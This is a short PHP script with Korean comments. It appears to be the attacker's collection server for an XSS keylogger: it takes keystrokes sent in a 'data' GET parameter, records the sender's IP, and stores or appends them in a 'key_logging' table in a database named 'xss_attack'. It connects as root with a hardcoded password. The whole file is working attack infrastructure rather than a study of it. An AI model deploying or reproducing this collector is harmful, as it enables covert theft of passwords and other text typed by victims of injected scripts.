<?php
// MySQL 데이터베이스에 연결
$db_conn = new mysqli("127.0.0.1", "root", "123456", "xss_attack");
// GET 요청으로 받은 'data' 파라미터를 개행,공백 등 문자 제거
$key = $db_conn->real_escape_string($_GET["data"]);
// 클라이언트의 IP 주소 가져오기
$remote_ip = $_SERVER["REMOTE_ADDR"];
// 'data' 파라미터가 비어있지 않은 경우에만 처리
if(!empty($key)) {
    // 현재 IP 주소로 데이터베이스에서 기존 레코드 검색
    $query = "select * from key_logging where ip='{$remote_ip}'";
    $tmp = $db_conn->query($query);
    $cnt = $tmp->num_rows;

    if($cnt == 0) {
        // 해당 IP 주소의 레코드가 없으면 새로운 레코드 삽입
        // 키 로깅 데이터를 IP 주소와 함께 저장
        $query = "insert into key_logging values(now(), '{$remote_ip}', '{$key}')";
    } else {
        // 해당 IP 주소의 레코드가 이미 있으면 기존 데이터에 새 키 로깅 데이터 추가
        $query = "update key_logging set data=concat(data, '{$key}') where ip='{$remote_ip}'";
    }

    // 준비된 쿼리 실행하여 키 로깅 데이터를 데이터베이스에 저장 또는 업데이트
    $db_conn->query($query);
}
// 데이터베이스 연결 종료
$db_conn->close();
?>
